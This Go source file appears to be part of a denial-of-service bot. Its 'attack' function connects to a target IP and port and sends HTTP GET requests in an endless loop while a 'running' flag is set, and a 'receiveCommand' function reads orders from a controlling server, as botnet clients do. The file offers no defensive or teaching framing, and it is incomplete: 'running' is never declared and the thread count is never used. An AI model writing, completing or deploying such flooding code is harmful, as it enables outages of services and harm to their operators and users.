package main

import (
	"fmt"
	"net"
)

type address struct {
	ip   string
	port string
}

var NUM_THREADS int = 10

// function to attack
func attack(target_addr address) {
	target := target_addr.ip + ":" + target_addr.port
	target_socket := connectSocket(target)
	request := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\n\r\n", target_addr.ip)
	for {
		if running == 1 {
			sendMsg(target_socket, request)
		} else {
			break
		}
	}
	closeSocket(target_socket)
}

// function to connect client to the server
func connectSocket(address string) net.Conn {
	conn, err := net.Dial("tcp", address)
	if err != nil {
		fmt.Println("Connection failed:", err)
		return nil
	} else {
		fmt.Println("Connection successful.")
	}
	return conn
}

// function to send message via socket connection
func sendMsg(socket net.Conn, msg string) {
	_, err := socket.Write([]byte(msg))
	if err != nil {
		fmt.Println(err)
	}
}

// function to close the socket
func closeSocket(socket net.Conn) {
	err := socket.Close()
	if err != nil {
		fmt.Println("Error closing socket: ", err)
	} else {
		println("Connection closed.")
	}
}

// function to receive commands
func receiveCommand(server_socket net.Conn, cmd *[]byte) {
	_, err := server_socket.Read(*cmd)
	if err != nil {
		fmt.Println("Error closing receiving command: ", err)
	} else {
		fmt.Println("Command received.")
	}
}
